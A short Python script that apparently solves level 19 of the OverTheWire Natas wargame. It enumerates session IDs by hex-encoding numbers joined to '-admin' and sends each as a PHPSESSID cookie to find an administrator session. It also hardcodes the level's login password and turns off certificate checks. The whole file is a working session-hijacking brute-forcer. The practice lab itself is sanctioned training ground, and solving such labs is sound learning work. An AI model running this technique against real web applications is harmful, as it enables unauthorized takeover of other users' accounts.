import requests
import string
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')

MAX = 640
count = 1

u="http://natas19.natas.labs.overthewire.org/index.php?debug"

while count <= MAX:
    # Updated: creates random admin value
    numberAsHex = "".join("{:02x}".format(ord(c)) for c in str(count))
    # Converted -admin to hex
    adminPortion = "2d61646d696e"
    # Combine
    sessionID = "PHPSESSID=" + numberAsHex + adminPortion
    # Output so human can see
    print(sessionID)

    headers = {'Cookie': sessionID}
    response = requests.get(u, headers=headers, auth=basicAuth, verify=False)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)

    count += 1

print("Done!")